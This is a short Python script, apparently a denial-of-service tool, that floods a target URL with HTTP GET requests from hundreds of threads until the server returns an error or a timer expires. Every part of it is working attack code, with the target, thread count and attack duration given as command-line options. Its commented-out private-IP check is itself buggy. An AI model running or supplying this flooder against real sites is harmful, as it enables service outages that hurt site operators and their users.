import threading
import argparse
import requests
import socket
import random
import time


start_time = 0
end_time = 60
flag = 0

def valid_target(target: str) -> bool:
    if target.split('.')[0] == '10':
        raise "Private IP network"
    elif target.split('.')[0] == '172' and (16 <= int(target.split('.')[1]) and int(target.split('.')[1] <= 31)):
        raise "Private IP network"
    elif target.split('.')[0] == '192' and target.split('.')[1] == '168':
        raise "Private IP network"
    else:
        return True


def tick():
    global start_time
    global end_time
    global flag

    while True:
        if end_time <= (time.time() - start_time):
            flag = 1
            print('----- Time End -----')
            exit(0)


def get_flood(target: str) -> None:
    global flag

    while flag != 1:
        res = requests.get(f'http://{target}')

        if res.status_code == 500:
            flag = 1
            print('----- Attack Finish -----')
            exit(0)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', help='target url', required=True)
    parser.add_argument('-t', help='thread count', type=int, default=500, required=False)
    parser.add_argument('-s', help='attack time',  type=int, default=60, required=False)

    args_p = parser.parse_args()

    '''
    valid = valid_target(args_p.u)
    if not valid:
        exit()
    '''

    end_time = args_p.s

    start_time = time.time()
    st = threading.Thread(target=tick, args=())
    st.start()

    for _ in range(args_p.t):
        t = threading.Thread(target=get_flood, args=(args_p.u,))
        t.start()   
